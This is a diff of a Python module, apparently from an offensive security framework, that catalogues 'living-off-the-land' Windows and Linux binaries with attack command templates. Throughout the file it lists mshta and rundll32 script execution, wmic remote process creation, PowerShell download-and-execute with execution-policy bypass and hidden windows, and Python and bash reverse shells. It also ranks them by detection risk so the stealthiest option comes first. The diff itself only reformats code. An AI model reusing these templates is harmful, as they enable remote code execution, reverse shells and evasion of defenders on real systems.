@@ -17,6 +17,7 @@ logger = logging.getLogger(__name__)
 @dataclass
 class LOLBin:
     """A Living-off-the-Land binary."""
+
     name: str
     os: str  # windows, linux, both
     path: str
@@ -69,7 +70,6 @@ WINDOWS_LOLBINS = {
         description="cURL (built into Windows 10+)",
         detection_risk="low",
     ),
-
     # Execution
     "mshta": LOLBin(
         name="mshta",
@@ -78,8 +78,8 @@ WINDOWS_LOLBINS = {
         capabilities=["execute", "download_execute"],
         commands={
             "execute_hta": "mshta <url_or_file>.hta",
-            "inline_vbs": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"<command>\"\", 0:close\")",
-            "inline_js": "mshta javascript:a=GetObject(\"script:<url>\").Exec():close()",
+            "inline_vbs": 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""<command>"", 0:close")',
+            "inline_js": 'mshta javascript:a=GetObject("script:<url>").Exec():close()',
         },
         description="HTML Application Host",
         detection_risk="high",
@@ -91,7 +91,7 @@ WINDOWS_LOLBINS = {
         capabilities=["execute", "dll_load"],
         commands={
             "execute_dll": "rundll32.exe <dll>,<entrypoint>",
-            "javascript": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"<command>\")",
+            "javascript": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("<command>")',
             "shell32": "rundll32.exe shell32.dll,ShellExec_RunDLL <program>",
         },
         description="DLL execution utility",
@@ -115,8 +115,8 @@ WINDOWS_LOLBINS = {
         path="C:\\Windows\\System32\\wbem\\WMIC.exe",
         capabilities=["execute", "recon", "lateral"],
         commands={
-            "process_create": "wmic process call create \"<command>\"",
-            "remote_exec": "wmic /node:<target> process call create \"<command>\"",
+            "process_create": 'wmic process call create "<command>"',
+            "remote_exec": 'wmic /node:<target> process call create "<command>"',
             "list_processes": "wmic process list brief",
             "system_info": "wmic os get caption,version",
         },
@@ -148,7 +148,6 @@ WINDOWS_LOLBINS = {
         description="MSI installer",
         detection_risk="medium",
     ),
-
     # PowerShell alternatives
     "powershell": LOLBin(
         name="powershell",
@@ -158,13 +157,12 @@ WINDOWS_LOLBINS = {
         commands={
             "download_execute": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('<url>')\"",
             "encoded": "powershell -enc <base64_command>",
-            "hidden": "powershell -WindowStyle Hidden -ep bypass -c \"<command>\"",
+            "hidden": 'powershell -WindowStyle Hidden -ep bypass -c "<command>"',
             "download_file": "powershell -c \"(New-Object Net.WebClient).DownloadFile('<url>','<output>')\"",
         },
         description="PowerShell - primary scripting tool",
         detection_risk="medium",
     ),
-
     # Recon
     "netsh": LOLBin(
         name="netsh",
@@ -218,7 +216,7 @@ LINUX_LOLBINS = {
         commands={
             "http_server": "python3 -m http.server <port>",
             "download": "python3 -c \"import urllib.request; urllib.request.urlretrieve('<url>','<output>')\"",
-            "reverse_shell": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "reverse_shell": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
             "execute_url": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('<url>').read())\"",
         },
         description="Python interpreter",
@@ -246,7 +244,7 @@ LINUX_LOLBINS = {
         commands={
             "reverse_shell": "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
             "reverse_shell_alt": "bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'",
-            "execute_url": "bash -c \"$(curl -s <url>)\"",
+            "execute_url": 'bash -c "$(curl -s <url>)"',
         },
         description="Bourne Again Shell",
         detection_risk="low",
@@ -322,10 +320,7 @@ class LOLBinDatabase:
 
     def find_by_capability(self, capability: str) -> list[LOLBin]:
         """Find LOLBins with a specific capability."""
-        return [
-            lolbin for lolbin in self._lolbins.values()
-            if capability in lolbin.capabilities
-        ]
+        return [lolbin for lolbin in self._lolbins.values() if capability in lolbin.capabilities]
 
     def get_alternative_command(
         self,
@@ -348,13 +343,15 @@ class LOLBinDatabase:
         for lolbin in lolbins:
             for cmd_name, cmd_template in lolbin.commands.items():
                 if capability in cmd_name or capability in cmd_template:
-                    alternatives.append({
-                        "lolbin": lolbin.name,
-                        "path": lolbin.path,
-                        "command": cmd_template,
-                        "detection_risk": lolbin.detection_risk,
-                        "description": lolbin.description,
-                    })
+                    alternatives.append(
+                        {
+                            "lolbin": lolbin.name,
+                            "path": lolbin.path,
+                            "command": cmd_template,
+                            "detection_risk": lolbin.detection_risk,
+                            "description": lolbin.description,
+                        }
+                    )
 
         return sorted(alternatives, key=lambda x: x["detection_risk"])
 
